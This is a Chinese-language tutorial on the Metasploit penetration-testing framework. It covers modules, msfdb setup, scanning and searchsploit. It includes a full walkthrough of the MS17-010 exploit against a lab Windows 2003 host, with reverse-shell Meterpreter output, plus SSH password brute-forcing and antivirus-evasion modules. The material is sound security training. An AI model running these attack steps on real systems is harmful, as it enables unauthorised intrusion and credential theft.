[TOC]



# ==MSF渗透测试框架基础==

教材内容

#### 一、MSF简介

##### 1、功能介绍

Metasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新。被安全社区冠以“可以黑掉整个宇宙”之名的强大渗透测试框架。

Metasploit是一款开源的渗透测试框架平台，到目前为止，msf已经内置了数千个已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写，这使得使用者能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。选定需要使用的攻击模块之后，你只需要使用简单的命令配置一些参数就能完成针对一个漏洞的测试和利用，将渗透的过程自动化、简单化。

##### 2、模块介绍

| **模块名**  | **中文解释** | **功能描述**                                                 |
| :---------- | :----------- | :----------------------------------------------------------- |
| Auxiliaries | 辅助模块     | 该模块不会直接在测试者和目标主机之间建立访问，它们只负责执行扫描、嗅探、指纹识别等相关功能以辅助渗透测试 |
| Exploit     | 漏洞利用模块 | 漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透测试攻击技术包括缓冲区溢出、Web应用程序攻击，以及利用配置错误等，其中包含攻击者或测试人员针对系统中的漏洞而设计的各种POC验证程序，用于破坏系统安全性的攻击代码，每个漏洞都有相应的攻击代码。 |
| Payload     | 攻击载荷模块 | 攻击载荷是我们期望目标系统在被渗透攻击之后完成实际供给功能的代码，成功渗透目标后，用于在目标系统上运行任意命令或者执行特定代码，在Metasploit框架中可以自由选择、传送和植入。攻击载荷也可能是简单地在目标操作系统上执行一些命令，如添加用户账号等。 |
| Post        | 后期渗透模块 | 该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作，如获取敏感信息、实施跳板攻击等 |
| Encoders    | 编码工具模块 | 该模块在渗透测试中负责免杀，以防止被杀毒软件、防火墙、IDS及类似的安全软件检测出来 |
| evasion     | 混淆模块     | 能够生成绕过杀毒软件的shell（目前只适用于Windows）           |
| Meterpreter | 后续利用模块 | 作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。通常也作为后渗透测试功能使用。 |

> 上述模块所在位置：/usr/share/metasploit-framework/modules

##### 3、文件结构

MSF主目录为/usr/share/metasploit-framework/,其中包括了config配置文件、plugins插件、tools工具、db数据库文件、modules模块文件以及msfconsole、msfdb等命令，modules中的文件为我们最常用的模块文件，其中每个模块中都根据不同的操作系统，分为不同平台不同协议功能对应的漏洞利用文件，这些文件用ruby编写。

```
config			metasploit的环境配置信息，数据库配置信息
data			后渗透模块的一些工具及payload，第三方小工具集合，用户字典等数据信息
db				rails编译生成msf的web框架时的数据库信息
documentation	 用户说明文档及开发文档
external		metasploit的一些基础扩展模块
lib				metasploit的一些基础类和第三方模块类
log				msf运行时的一些系统信息和其他信息
modules 		metasploit的系统工具模块，包括预辅助模块（auxiliary），渗透模块(exploits),攻击荷载(payloads)和后渗透模块(posts)，以及空字段模块(nops)和编码模块(Encoders)
msfbinscan 		对bin文件进行文件偏移地址扫描
msfcli 			metasploit命令行模式，可以快速调用有效的payload进行攻击，新版本的metasploit即将在2015年6月18日弃用
msfconsole		metasploit的基本命令行，集成了各种功能。
msfd 			metasploit服务，非持久性服务
msfelfscan 		对linux的elf文件偏移地址进行扫描
msfencode 		metasploit的编码模块，可以对mepayload和shellcode进行编码输出
msfpayload 		metasploit攻击荷载，用以调用不同的攻击荷载，生成和输出不同格式的shellocode，新版本用msfvenmon替代。
msfmachscan 	功能同msfelfscan
msfpescan 		对windows的pe格式文件偏移地址进行扫描
msfrop 			对windows的pe进行文件地址偏移操作，可以绕过alsr等
msfrpc 			metasploit的服务端，非持久性的rpc服务
msfrpcd 		持久性的metasploit本地服务，可以给远程用户提供rpc服务以及其他的http服务，可以通过xml进行数据传输。
msfupdate 		metasploit更新模块，可以用来更新metasploit模块
msfvenom 		集成了msfpayload和msfencode的功能，效率更高，即将替代msf payload和msfencode
plugins 		metasploit的第三方插件接口
scripts 		metasplit的常用后渗透模块，区别于data里的后渗透模块，不需要加post参数和绝对路径，可以直接运行
test 			metasploit的基本测试目录
tools 			额外的小工具和第三方脚本工具
```

##### 4、基本命令

```
msfconsole   #启动MSF console界面
msfupdate    #msf版本更新 ，目前使用apt update进行更新
help/?       #打印当下窗口的帮助文档 
help command/command --help #打印command命令的帮助文档 
connect      #可以看成是msfconsole界面下的nc工具 
edit         #编辑模块的ruby文件，与用vim编辑相同 
show         #查看命令，可以看当前环境下的exploits、auxiliary、payloads等模块,其中Rank表示不同模块的评级（成功率和使用难易程度的重要参考）， 最常使用的是`show options`命令，表示当前上下文环境中的选项内容,`show missing`可以查看当前有哪些必须的配置没有设置 
show advanced   #一些不常用的高级选项，不会在`show options`中显示 
search       #搜索关键词内容对应的模块，如搜索ms10_046漏洞模块：（注意搜索出的内容所在基本目录为`/usr/share/metasploit-framework/modules/`）,除此之外search还可以添加一些筛选条件，如name、path、type等
info         #当前模块的基本信息 
use          #使用不同的模块文件 
set/unset    #设置变量/取消变量设置 
setg/unsetg  #设置全局变量/取消全局变量设置，只会设置当前msf运行环境中的变量，退出msf后设置就复位 
save         #将设置保存到/root/.msf4/config，msf启动时会读取该文件，这样重新启动msf后设置依然保留 
back         #从模块上下文退回到msfconsole初始目录 
run/exploit  #运行漏洞模块 
sessions     #可以看见当前已经建立的攻击连接，利用`sessions -i id`命令进入指定连接 
jobs         #查看后台运行的模块 load/unload  #连接插件，如load openvas，然后会出现相应的openvas命令，使用时需要用openvas_connect连接外部扫描器 
loadpath     #调用自己编写的功能模块 
route        #向session指定路由 
resource     #调用rc文件的命令并执行，以方便直接取得session
```

#### 二、MSFDB数据库操作

##### 1、PostgreSQL命令

```
systemctl status postgresql
普通用户模式下：sudo -u postgres psql postgres 直接进入PSQL命令行
\l 查看数据库列表\
c msf 切换数据库到msf
\d 查看当前数据库的所有表
\d users：查看users表的列
\q 退出
SQL语句：正常的CRUD操作
```

##### 2、数据库管理命令

MSF默认使用Kali内置的PostgreSQL数据库，也可以修改为MySQL。

```
msfdb init        初始化数据库
msfdb reinit    重新初始化
msfdb delete    删除数据库
msfdb start        启动数据库
msfdb stop        停止数据库
msfdb status    查看数据库状态
db_connect msf:admin@127.0.0.1:3306/msf    前一个msf：用户名，admin：密码，后一个msf：数据库名称
```

##### 3、数据库操作命令

```
db_connect            
db_disconnect
db_status         #查看数据库状态，有无连接
db_nmap           #后续可以用hosts命令来查询扫描出的主机
db_rebuild_cache  #建立模块文件的缓存，使search搜索速度更快        
db_remove
db_export         #导出备份信息
db_import         #导入备份信息，备份为xml文件
```

#### 三、信息收集模块

所利用的模块基本在`auxiliary/scanner/`目录中，包含扫描、fuzz测试、漏洞挖掘、网络协议欺骗等程序。

##### 1、db_nmap

借助于nmap的功能进行扫描，所有参数与nmap相同

```
db_nmap -sn 192.168.112.1/24   # 扫描存活主机
msf6 > db_nmap -sn 192.168.112.1/24
[*] Nmap: Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 01:11 CST
[*] Nmap: Nmap scan report for 192.168.112.1 (192.168.112.1)
[*] Nmap: Host is up (0.00015s latency).
[*] Nmap: MAC Address: 00:50:56:C0:00:08 (VMware)
[*] Nmap: Nmap scan report for 192.168.112.2 (192.168.112.2)
[*] Nmap: Host is up (0.00013s latency).
[*] Nmap: MAC Address: 00:50:56:F4:64:3A (VMware)
[*] Nmap: Nmap scan report for 192.168.112.158 (192.168.112.158)
[*] Nmap: Host is up (0.00014s latency).
[*] Nmap: MAC Address: 00:0C:29:5E:35:7D (VMware)
[*] Nmap: Nmap scan report for 192.168.112.160 (192.168.112.160)
[*] Nmap: Host is up (0.00020s latency).
[*] Nmap: MAC Address: 00:0C:29:2B:6E:C7 (VMware)
[*] Nmap: Nmap scan report for 192.168.112.188 (192.168.112.188)
[*] Nmap: Host is up (0.00017s latency).
[*] Nmap: MAC Address: 00:0C:29:45:E5:75 (VMware)
[*] Nmap: Nmap scan report for 192.168.112.254 (192.168.112.254)
[*] Nmap: Host is up (0.00018s latency).
[*] Nmap: MAC Address: 00:50:56:EA:AE:C8 (VMware)
[*] Nmap: Nmap scan report for 192.168.112.148 (192.168.112.148)
[*] Nmap: Host is up.
[*] Nmap: Nmap done: 256 IP addresses (7 hosts up) scanned in 1.93 seconds
```

##### 2、ARP扫描

![image-20240910160948981](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240910160948981.png)

##### 3、端口扫描

```
search portscanuse 
auxiliary/scanner/portscan/syn # 也可以用ack、tcp连接等方式
set INTERFACE/RHOSTS/THREADS/PORTS 
run                                # 扫描指定主机的指定端口
```

##### 4、UDP扫描

```
use auxiliary/scanner/discovery/udp_sweep
```

##### 5、SMB扫描

SMB（ServerMessage Block）通信协议是微软（Microsoft）和英特尔(Intel)在1987年制定的协议，主要是作为Microsoft网络的通讯协议。SMB服务的作用在于计算机间共享文件、打印机和串口等。如果*smb*服务未启用,将影响一些功能的正常使用，所以不建议关闭。

```
# 输入用户名和密码后的消息会更具体
use auxiliary/scanner/smb/smb_version      # SMB版本、系统版本扫描
use auxiliary/scanner/smb/pipe_auditor     # 扫描命名管道，判断SMB服务类型
```

##### 6、SSH扫描

```
use auxiliary/acanner/ssh/ssh_version      # SSH版本、系统版本扫描
use auxiliary/acanner/ssh/ssh_login        # 爆破SSH密码**
set RHOSTS/USER_FILE/PASS_FILE             # 设置爆破的用户名和密码字典表，也可以单独设置密码文件    
run
```

##### 7、漏洞扫描

以经典的ms17-010为例

```
search ms17-010   # 查找 auxiliary/scanner/smb/smb_ms17_010
use auxiliary/scanner/smb/smb_ms17_010    # 使用本扫描模块
show options      # 查看需要设置的选项，主要是rhosts (rhosts -> remote host， lhosts -> local host)
set rhosts 192.168.112.158    # 设置远程目标主机IP地址
run                  # 执行当前模块的功能
```

#### 四、漏洞利用

根据信息收集结果搜索漏洞利用模块，如NMap，Nessus等，在MSF中进行漏洞查找，找exploit模块下是否存在现有漏洞，并且进行利用。此处以Windows 2003为例，先通过Nessus或Nmap扫描，获取了主机漏洞列表。

![image-20211130032243248](https://gitee.com/ymq_typroa/typroa/raw/main/20211130032243.png)

然后，在MSF中运行以下命令，获取系统Shell，并执行任意命令。

```
search ms17-010
use exploit/windows/smb/ms17_010_psexec
set rhosts 192.168.112.158runmsf6 exploit(windows/smb/ms17_010_psexec) > 
run
[*] Started reverse TCP handler on 192.168.112.148:4444 
[*] 192.168.112.158:445 - Target OS: Windows Server 2003 3790 Service Pack 2
[*] 192.168.112.158:445 - Filling barrel with fish... done
[*] 192.168.112.158:445 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.112.158:445 -       [*] Preparing dynamite...
[*] 192.168.112.158:445 -               Trying stick 1 (x64)...Miss
[*] 192.168.112.158:445 -               [*] Trying stick 2 (x86)...Boom!
[*] 192.168.112.158:445 -       [+] Successfully Leaked Transaction!
[*] 192.168.112.158:445 -       [+] Successfully caught Fish-in-a-barrel
[*] 192.168.112.158:445 - <---------------- | Leaving Danger Zone | ---------------->
[*] 192.168.112.158:445 - Reading from CONNECTION struct at: 0x8757f010
[*] 192.168.112.158:445 - Built a write-what-where primitive...
[+] 192.168.112.158:445 - Overwrite complete... SYSTEM session obtained!
[*] 192.168.112.158:445 - Selecting native target
[*] 192.168.112.158:445 - Uploading payload... aDBkWucb.exe
[*] 192.168.112.158:445 - Created \aDBkWucb.exe...[+] 192.168.112.158:445 - Service started successfully...
[*] Sending stage (175174 bytes) to 192.168.112.158
[*] 192.168.112.158:445 - Deleting \aDBkWucb.exe...
[*] Meterpreter session 5 opened (192.168.112.148:4444 -> 192.168.112.158:1029) at 2021-11-30 03:24:55 +0800

meterpreter >  # 进入meterpreter提示符，表示入侵成功
```

入侵成功后， 简单运行一下meterpreter命令：

```
meterpreter > getpid
Current pid: 1236

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : GOD-111
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86System Language : zh_CN
Domain          : WORKGROUPLogged On Users : 2
Meterpreter     : x86/windows

meterpreter > screenshot
Screenshot saved to: /home/denny/SmGGQrCx.jpeg

meterpreter > shell    # 直接进入Windows2003命令提示符
```

Meterpreter更多用法后续课程专门介绍。

#### 附一：searchsploit命令：

用于搜索在线漏洞数据库www.exploit-db.com的漏洞和POC数据。本地文件路径：/usr/share/exploitdb/exploits

![image-20211129235345210](https://gitee.com/ymq_typroa/typroa/raw/main/20211129235345.png)

#### 附二：MSF运行于其他操作系统上

MSF也可以单独安装并运行于Windows、MacOS和Linux上，只需要去官网下载对应版本即可：https://www.metasploit.com/
下图是Window环境的安装和运行截图：

![image-20220804145540457](https://gitee.com/ymq_typroa/typroa/raw/main/20220804145540.png)

在Windows上运行MSF：

![image-20220804145627410](https://gitee.com/ymq_typroa/typroa/raw/main/20220804145627.png)

#### 五、初步使用MSF步骤

##### 1、开启postgresql数据库

```
systemctl status postgresql
systemctl start postgresql
systemctl status postgresql
```

![image-20240910161703509](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240910161703509.png)

##### 2、进入postgresql数据库

此时尽管是以root用户运行的命令行，依然需要使用 sudo -u 进入postgresql数据库

```
sudo -u postgres psql postgres
```

![image-20240910162019990](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240910162019990.png)

##### 3、数据库执行指令

```
\l		查看数据库
\c msf		切换到msf数据库
\d		查看该数据库中的所有表
\d creds	指定查看该数据库中的 creds 表
```

`\d` 结果如下

![image-20240911093743940](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911093743940.png)

`\d creds` 结果如下

![image-20240911093817309](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911093817309.png)

> 注意，如果此时查看数据库时发现没有msf数据库
>
> ![image-20240910225417616](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240910225417616.png)
>
> 是因为第一次使用没有对msfdb进行初始化，此时需要退出postgresql数据库执行指令 `msfdb init`
>
> ![image-20240910225524071](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240910225524071.png)
>
> 此时再进入postgresql数据库查看数据库就发现msf数据库已经存在，可以连接
>
> ![image-20240910225625704](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240910225625704.png)

#### 4、进入msfconsole

![image-20240911093936731](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911093936731.png)

可以执行一些指令 比如和namp一样的 db_nmap -O 扫描操作系统

![image-20240911094518563](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911094518563.png)

#### 5、搜索漏洞模块

```
search windows		搜索与windows系统漏洞有关的信息
```

![image-20240911095311412](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911095311412.png)

```
searchsploit thinkphp		直接搜索可利用漏洞
```

![image-20240911095746728](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911095746728.png)

```
searchsploit 48333			直接按照编号搜索漏洞
searchsploit -p 48333		也是按照漏洞编号搜索，不过内容不同，这个更详细一点
```

![image-20240911095959671](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911095959671.png)

![image-20240911100038207](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911100038207.png)

```
searchsploit -p 33933
cat /usr/share/exploitdb/exploits/php/webapps/33933.txt
两条命令结合查看该漏洞的payload
```

![image-20240911100450563](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911100450563.png)

#### 6、扫描存活系统主机

```
db_nmap -sn 192.168.230.130-150		-sn 表示只进行ping扫描，不对端口扫描
```

![image-20240911104038509](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911104038509.png)

#### 7、扫描主机漏洞

```
db_nmap --script=vuln 192.168.230.135
```

![image-20240911111600145](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911111600145.png)

有漏洞的情况如下：

![image-20240911111811945](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911111811945.png)

#### 8、根据漏洞编号寻找msf内置模块

```
search ms17-010
use 寻找出来的编号（选择辅助模块auxiliary）
use auxiliary/scanner/smb/smb_ms17_010
```

![image-20240911112541638](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911112541638.png)

#### 9、如何利用辅助模块（auxiliary）进行扫描

```
show optinons		查看我们需要配置哪些参数
set 参数名 参数值		参数值就是目标对应的参数值
```

![image-20240911113059617](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911113059617.png)

> 需要注意的是，这里的默认端口是 445 端口，也就是 smb 服务的默认端口，如果目标主机没有开放该端口就需要另做修改

参数设置好了直接 run

![image-20240911113210729](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911113210729.png)

#### 10、寻找利用攻击模块（exploit）进行漏洞利用

```
search ms17-010
```

![image-20240911114133221](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911114133221.png)

对每一个 exploit 模块进行 use ， 目的是来尝试到底哪一个可以利用成功，然后 use 之后再进行 `show options` 和 `set 参数名 参数值` 最后再 `run`  或者 `exploit` 

![image-20240911114550650](https://gitee.com/ymq_typroa/typroa/raw/main/image-20240911114550650.png)

ues 到正确的 exploit 模块然后 运行 `run` 或者 `exploit` 就可以漏洞利用 ，如果出现 reverse 字样，说明攻击机 就可以获取到受害主机的shell，此时命令提示符名称变为 meterpreter 